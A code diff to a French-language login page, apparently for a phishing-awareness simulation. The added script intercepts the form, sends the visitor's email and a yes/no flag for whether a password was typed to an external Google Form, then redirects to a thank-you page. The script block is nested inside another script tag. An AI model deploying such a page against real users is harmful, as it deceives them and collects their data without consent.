@@ -111,10 +111,30 @@
       transition: background 0.15s;
     }
 
+    .help {
+      margin-top: 24px;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      font-size: 13px;
+      color: var(--ink-soft);
+      text-align: center;
+    }
+
+
+    
     .linksmdp {
       color: #030303;
       text-align: right;
       text-decoration: underline;
+    }
+
+    @media (max-width: 760px) {
+      .page { flex-direction: column; }
+      .brand { padding: 32px; }
+      .brand-quote p { font-size: 22px; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * { transition: none !important; }
     }
 
     .btn-primary:hover {
@@ -138,6 +158,8 @@
         <div class="card-title">Se connecter</div>
 
         <form id="login-form">
+          <input type="hidden" id="password_entered" name="password_entered">
+          
           <label class="form-label">Adresse email</label>
                   <div class="input-wrapper">
                     <input
@@ -171,6 +193,7 @@
           
           <button class="btn-primary">Se connecter</button>
 
+           <p class="help">Pas encore de compte ? <a href="#">Contactez votre administrateur</a></p>
         </form>
       </div>
     </div>
@@ -185,6 +208,36 @@
 
       right.style.height = img.clientHeight + "px";
     };
+<script>
+const form = document.getElementById("login-form");
+const password = document.getElementById("password");
+const passwordEntered = document.getElementById("password_entered");
+
+password.addEventListener("input", () => {
+  passwordEntered.value = password.value.length > 0 ? "oui" : "non";
+});
+
+form.addEventListener("submit", async function (event) {
+  event.preventDefault();
+
+  const email = document.getElementById("email").value;
+  const passwordEnteredValue = document.getElementById("password_entered").value;
+
+  const formData = new FormData();
+  formData.append("entry.1929481674", email);              // email
+  formData.append("entry.1866534026", passwordEnteredValue);    // oui/non
+
+  await fetch("https://docs.google.com/forms/d/e/1FAIpQLSczbeHj-lLngu1aUIptFIb-tkG59VbrfgFsdv0SOi8H3CLvmA/formResponse", {
+    method: "POST",
+    body: formData,
+    mode: "no-cors"
+  });
+
+  window.location.href = "merci.html";
+});
+</script>
+
+    
   </script>
 
 </body>
